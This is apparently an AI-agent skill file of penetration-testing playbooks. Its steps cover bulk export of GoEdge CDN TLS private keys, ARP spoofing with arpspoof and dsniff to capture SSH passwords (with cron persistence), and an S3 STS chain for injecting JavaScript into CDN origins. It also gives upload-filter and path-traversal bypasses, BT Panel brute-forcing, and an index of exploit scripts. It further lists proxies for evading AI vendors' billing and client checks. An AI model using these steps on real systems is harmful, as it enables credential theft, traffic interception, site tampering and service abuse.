---
name: specialized-attack-playbooks
description: >-
  Specialized hands-on exploitation: GoEdge private-key export, gray-operations CDN forensics, ARP MITM, CDN→S3 STS chain, BT Panel + UniApp, AI IDE API reverse-proxy, OCS + MinIO; includes references/scripts support-file index. Use when applying specialized playbooks for GoEdge, CDN, ARP MITM, BT Panel, OCS, MinIO.
metadata:
  tags: [penetration-testing, penetration-testing, red-team]
---

## Specialized hands-on exploitation (all inline)

### GoEdge CDN (port 8002) private-key bulk export
```
Fingerprint: curl -s http://T:8002/ → {"message":"Welcome to API"} | POST /SSLCertService/findEnabledSSLCertConfig → requires X-Cloud-Access-Token
Vulnerability: findEnabledSSLCertConfig validates identity but not scope → any administrator key can export the whole system's TLS private keys (keyData = plaintext PEM, base64)
Two-step authentication: POST /APIAccessTokenService/getAPIAccessToken {"accessKeyId":AK,"accessKey":SK,"type":"admin"} → data.token
              Subsequent requests carry Header X-Cloud-Access-Token: <token>
Bulk extraction (Python): for id in range(1,500): POST /SSLCertService/findEnabledSSLCertConfig {"sslCertId":id} headers={token}
  → r.json()['data']['sslCertJSON'] base64-decode → json → dnsNames + keyData (base64 PEM private key) | Skip b64 == "bnVsbA==" (null)
Assets: Fofa app="GoEdge"&&port="8002" / Shodan http.title:"GoEdge" port:8002 / "Welcome to API" port:8002
Exploitation: private keys → MITM / traffic decryption / forged certificates | AK/SK credential reuse against other GoEdge instances | take admin access to reach the CDN edge nodes
```

### Gray-operations CDN post-compromise forensics (after taking the CDN, map out what it operates)
```
Five steps: ①full certificate enumeration (IDs 1-500; expired/disabled ones also contain private keys, revealing the history of operations) ②initial classification by keywords ③real-access verification (critical! do not trust the certificate domain alone;
      requests follows redirects to see the final landing page title/meta/h1/JS redirects) ④re-classify by real content ⑤mark high-value targets
Keyword matrix (dnsNames classification): wallet phishing tokenpocket/tokenpoket (transposed-letter typo-squatting)/metamask/trust | payment fraud paypal/wxpay/bayspay/147pay
  adult pay-site clusters xiuren/xrw/sood/laikantu/tuhaokan/kantu | pirated video 7she/acgzy/yiyiyi/dilige/80sjdy/mogudong
  VPN tunneling futo-on/xyou/gogocloud/douyinjiasu/tudoujiasu | wildcard-site-cluster SEO 0x000/tc7/vn00/fc000/ikkk (programmatic wildcard-resolution redirect chains) | lottery fraud 0149/dh49/999pian (pian = scam)
High-value marking: Grade-A in-valid-period wallet/payment private keys → MITM / HTTPS-phishing green padlock | Grade-B ACME auto-renewal certificates for continuous monitoring | Grade-C AK/SK credential reuse + WHOIS correlations to the operator's other assets
Identification traits (🔴 very high): same server mixing normal sites + adult + piracy | large wildcard-site-cluster wildcard certificates | brand domains + counterfeit domains on the same CDN (an insider operating phishing) | a single administrator key can export all private keys (GoEdge has no isolation by default)
```

### ARP MITM on the same L2 to steal SSH passwords (target on the same subnet, password unknown)
```
Applies when: target on the same L2 (same Hyper-V host / same VLAN) + an already-controlled foothold machine + target SSH password unknown
🚨Critical pitfall: arpspoof reports "couldn't arp for host" (libnet's MAC resolution often times out on Hyper-V/CentOS7)
  Fix: ip neigh replace <target-IP> lladdr <target-MAC> dev eth0 nud permanent (pre-fill the gateway the same way) → bypasses libnet resolution, arpspoof then works normally
Deploy: echo 1>/proc/sys/net/ipv4/ip_forward | arpspoof × 4 both directions (one process each for target↔gateway) | tcpdump -w x.pcap -s0 -C100 -W10 host <target>
  dsniff -i eth0 -w /tmp/dsniff.log (specialized capture of plaintext SSH/FTP/HTTP passwords)
Persistence: crontab '*/2 * * * * /root/mitm_chk.sh' as placeholder + rc.local auto-start at boot
Verify: pgrep -c arpspoof==4 | tcpdump -r x.pcap to see whether target traffic was intercepted
Event notification: hermes cron create 'every 2 minutes' --no-agent --deliver feishu:chat_id (notify only when there's a catch: script detects new content in the dsniff log → stdout output → delivery; silently when no new content)
Cleanup: pkill arpspoof/tcpdump/dsniff | echo 0>ip_forward | remove the mitm line from crontab | ip neigh del each entry | rm pcap/log
```

### Multi-layer domain-rotation CDN anti-ban system → S3 STS credential-escalation attack chain
```
Architecture identification: entry domain → JS redirect layer 1 (random subdomain + wildcard DNS) → redirect layer 2 → real business site (static landing)
  CDN traits: Server: Xcdn | "Please access via the domain name" | 987dns.com domestic DNS dispatch (overseas resolves to 0.0.0.0)
  Key breakthrough points:
    ①The real business site's inline JS exposes the mainDomains list (progressing layer by layer) + base64-encoded sub-site redirect configuration
    ②The deepest landing page references CDN-offsite origin resources (ug458.com/idcpc8.com etc.) → bypass the CDN and attack the origin directly
    ③The origin is S3 (AmazonS3 header / ListBucket public) → exposes the bucket name
    ④The same site offers an APK download → reverse it to extract the API domain + AES key + STS acquisition path
    ⑤Register → log in → JWT → /BBS/GetSTSToken → AWS STS temporary credentials (PutObject permission)
    ⑥S3 write = CDN origin tampering = JS injection for every user (equivalent to RCE)

  Technical details:
    AES-CBC-encrypted API communication: the key is exposed twice, in frontend JS (lazyDecryptImg.js) and in the APK (.so strings)
    ASP.NET backend: tell from validation-error format + traceId | prefer form-urlencoded (JSON may give 415)
    No registration verification: no SMS / no CAPTCHA / any phone number → bulk registration possible
    STS over-privilege: an ordinary-user role obtains s3:PutObject → overwrite CDN origin files
    S3 bucket ListBucket public: the prefix parameter is ineffective (CDN cache), but connecting directly to the S3 domain allows full enumeration
  Reference: references/cdn-antiblock-s3-attack-chain.md
```

### BT Panel (Baota Panel) penetration + UniApp/DCloud APK reverse engineering
```
=== BT Panel fingerprint identification ===
Fingerprint: ports 19362/8888/random high ports + Cookie names containing a 32-hex MD5 hash with the "_ssl" suffix (e.g. 721301c19a31e887cb1f5a5726fbaae5_ssl)
  A Set-Cookie appearing in a 404 response = confirmed BT panel; port 888 usually hosts phpMyAdmin (403 = IP whitelist)
Security entrance: newer Baota enforces a random 8-character path (/xxxxxxxx/); without guessing it you cannot reach the panel. All API endpoints live behind the security-entrance path.
  Brute strategy: domain-related variants (bt + domain prefix) + common ops habits (admin888/bt123456/btpanel) + 8 random characters (very low success rate)
  Bypass: no known generic bypass (2024+); the old CVE-2023-38038 (phpmyadmin unauthenticated) only affects <=7.7
  Lateral idea: multiple sites on the same IP share Baota → break into a weak site → move laterally to the target site; Baota's default www user manages all sites

=== UniApp/DCloud APK reverse engineering (extremely efficient) ===
Identification: assets/dcloud_uniplugins.json + assets/apps/<appid>/ + uni-jsframework.js
Core: the business logic lives entirely in the JS/Vue files under assets/apps/<appid>/www/ (no need for jadx to decompile Java)
  API extraction: grep -r 'https\?://' assets/apps/ | filter baseURL/apiUrl/request configuration
  Authentication: search token/key/secret/Authorization → hardcoded credentials commonly in config.js/env.js/manifest.json
  Encryption: search aes/encrypt/decrypt/sign → frontend encryption = plaintext (the key must be in the JS)
  WebSocket: search wss://ws:// → real-time-communication backend address
Priority: manifest.json (appid/version/permissions) → config or env-related JS (API addresses) → page JS (business logic/IDOR)

=== ChengZi site-builder (ChengZi/d3504.cn) SDK decryption ===
Scenario: porn / gray-operations APP-distribution landing pages commonly use ChengZi for no-form-fill invites + redirects + APK distribution
init3 endpoint: POST /web/<appkey>/<channel>/init3 → returns URL-safe base64-encoded XOR-encrypted data
Decryption: base64url_decode → per-byte XOR 0x96 → JSON (contains fu = download URL, ph = package path, fm = redirect method)
  Script: scripts/chengzi_decrypt.py
Exploitation: decrypt to obtain the real APK's Aliyun FC function URL → download the APK → reverse it to extract the backend API
```

### AI IDE API reverse-proxy / key-leak directory (discover and evaluate AI-coding tool reverse-proxy solutions)
```
Background: Cursor Web free API from 2026-04 has only gemini-3-flash left, Claude entirely cut → getting Claude 4.6+ needs other channels
Usable solutions: freemodel-cc-proxy (free, FreeModel real Claude, disguises the Claude Code fingerprint to bypass 403, Opus4.8/Sonnet4.6) | WindsurfAPI (dwgx, Windsurf gRPC converted to API, 100+ models, account-pool rotation)
  askalf/dario (Claude Pro/Max subscription converted to API, bypassing headless billing) | bypass/chatgpt-adapter (xllm-go, aggregates reverse-engineered interfaces from multiple vendors into OpenAI format)
Deprecated: cursor2api/cursor2api-go (only gemini-3-flash left) | auxiliary: claude-tap (MITM intercepts an AI Agent's real traffic to study system prompts/tool calls)
GitHub search method: api.github.com/search/repositories?q=cursor+api+reverse+proxy&sort=stars → filter by description → /repos/<o>/<r>/readme (base64-decode to read) → /search/issues to check current status
Keywords: cursor api reverse proxy / cursor workos token / claude proxy cursor / AI IDE api reverse engineering
```

### OCS online-customer-service system penetration + MinIO object-store exploitation
```
Entry discovery: the landing page's customer-service link exposes the OCS domain (e.g. leiyushan.com) → Playwright loads the SPA and intercepts the real API calls
Authentication flow: POST /api/v1/v/init {cid,vid} → data.tk = visitor token; subsequent requests carry header x-v-token: <token>
Core APIs: /api/v1/v/bc (start chat) /api/v1/v/oss/sign (obtain upload sign) /api/v1/v/message/send (send message)
Upload chain: GET /api/v1/v/oss/sign → {sn,et,ul,ulw,dir,cid,og} → POST https://UL/api/v1/f/wj/tr
  Request headers: sign=<sn>, expTime=<et>  Form: file=@file, cid=<cid>, dir=<dir>, og=<og>, fn=<filename>, fg=0
Blacklist bypass (extensions outside the whitelist are intercepted):
  ✓ .jsp.jpg (double extension, the last ext passes detection) ✓ .jsp%00.jpg (null-byte truncation) ✓ .jsp;.jpg (Tomcat path parameter)
  ✗ .jsp/.jspx/.JSP/.Jsp/war/php/py/sh/xml/svg/html/txt/json/yaml/properties/sql/doc/ini/conf
⚠️ Files are stored in MinIO object storage = static objects, not executed by Tomcat (writing into the webroot is required for RCE)
  Verification: curl https://UL/bucket/dir/date/filename → returns the file content (plain text, not executed)
dir parameter traversal: the sign service does not validate dir content (always returns a fixed bucket sign); the upload service checks bucket permissions
  dir=conf → 500 (attempted write to the conf bucket but insufficient permissions) dir=../../ → 500 (traversal rejected)
MinIO Console (port 9001): POST /api/v1/login {"accessKey":"X","secretKey":"Y"} → 403=invalid Login
  CVE-2023-28432: POST /minio/health/cluster?verify → patched in new versions (returns BadRequest, no env leak)
CDN-layer identification (response-size fingerprinting):
  CDN WAF interception page ~2000 bytes | WSCN JS challenge page ~6000 bytes (Embed Iframe) | nginx 404 = 146 bytes
  Spring Boot JSON 404 ~100 bytes | Tomcat HTML 404 ~435 bytes
nginx method restriction: admin paths (/api/v1/a/ /api/v1/s/) only allow GET → POST returns 405
WSCN web-host CDN JS challenge: Playwright passes automatically | path whitelist independent of the JS challenge (with the challenge passed, still intercepted by path ACL)
Spring Boot path traversal: /c/..;/path → bypasses the nginx path ACL and reaches Spring Boot (semicolon = Tomcat path-parameter truncation)
BT Panel entrance: Set-Cookie leaks the cookie name → entrance path is 8 random characters and not derivable, only brute enumeration
Longteng CDN: TLS certificate exposes all related domains | Server header exposes the origin's OS version
```

## Support-file index

```
=== references/ attack-chain write-ups ===
cdn-antiblock-s3-attack-chain.md        multi-layer domain-rotation CDN anti-ban → S3 STS credential-escalation chain
faka-system-attack-chain.md             carding system (XHFAKA/Xinghai) enumeration / second-order XSS / lock bypass / WAF blind spots
ocs-im-system-attack-chain.md           OCS online customer-service IM system complete attack chain
ocs-minio-upload-attack-chain.md        OCS upload → MinIO object-store exploitation chain
chinese-app-distribution-pentest.md     domestic gray-operations APP distribution landing-page penetration (ChengZi/FC/CDN)
phpcms-v9-attack-surface.md             PHPCMS V9 attack surface

=== references/ CDN/Spring/WebSocket bypass ===
spring-boot-cdn-bypass.md               Spring Boot Actuator path traversal + interceptor bypass
cdn-waf-bypass-spring-boot.md           CDN WAF bypass (502/JS challenge) + Spring backend
cdn-bypass-gccdn-ocs.md                 GCCDN/web-host response-filter bypass
cdn-websocket-bypass-spring-auth.md     WebSocket upgrade bypassing the CDN to reach Spring
stomp-websocket-cdn-bypass.md           STOMP over SockJS CDN bypass
sockjs-stomp-exploitation.md            SockJS/STOMP privilege-escalation + SpEL injection
spring-stomp-sockjs-exploitation.md     Spring STOMP authentication + unauthorized subscription

=== references/ nginx/PHP fingerprinting ===
nginx-pathinfo-bypass-and-fingerprint.md   PATH_INFO bypassing deny + response-size fingerprinting
nginx-php-fingerprint-bypass.md            nginx/PHP-FPM fingerprint differential
nginx-404-differential-fingerprinting.md   catch-all vs true-404 differential enumeration

=== references/ APK reverse engineering ===
uniapp-apk-reverse-engineering.md       UniApp/DCloud complete reversing (JS/.so/.dat)
uniapp-apk-reversing.md                 UniApp reverse quick-reference (RC4 deobfuscation + domain discovery)
uniapp-dcloud-apk-reversing.md          DCloud structure + HTTPDNS identification
bt-panel-attack-methodology.md          BT Panel fingerprinting + entrance brute + lateral movement

=== scripts/ ===
js_rc4_deobfuscate.js       JS RC4 + string-array rotation deobfuscation (extract → node decode)
chengzi_decrypt.py          ChengZi site-builder init3 XOR decryption (fu download URL)
decrypt_aes_cbc_api.py      AES-CBC encrypted API communication decryption template (hardcoded key/iv)
s3_sts_exploit.py           AWS S3 STS temporary-credential exploitation (verify / list directories / write / permission enumeration)
stomp_sockjs_exploit.py     STOMP over SockJS exploitation template (CDN bypass + authentication + injection)
spring_stomp_exploit.py     Spring STOMP unauthorized subscription / send
```
